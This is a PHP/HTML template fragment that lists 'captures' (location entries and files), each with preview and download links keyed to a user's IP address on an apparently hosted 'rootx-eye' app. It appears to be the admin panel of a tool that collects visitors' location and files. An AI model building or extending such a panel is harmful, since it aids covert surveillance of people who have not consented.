            ...
            <div class="grid" id="cardGrid">
                ...
                <?php else: ?>
                    ...
                    <div class="card" data-type="<?= $capture['type'] ?? 'unknown' ?>">
                        ...
                        <div class="actions">
                            <?php if ($type != 'location' && !empty($file)): ?>
                                <?php 
                                // File path ko sahi karo
                                $preview_url = 'https://rootx-eye-1.onrender.com/' . ltrim($file, '/');
                                ?>
                                <a href="<?= $preview_url ?>" target="_blank" class="btn-preview" style="background:#3498db; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">🖼️ Preview</a>
                                <a href="download.php?download=<?= $index ?>&user=<?= urlencode($user['ip']) ?>" class="btn-download" style="background:#00b894; color:#fff; padding:5px 14px; border-radius:6px; text-decoration:none; font-size:12px; font-weight:500; transition:0.3s; display:inline-block; margin:0 5px;">⬇️ Download</a>
                            <?php endif; ?>
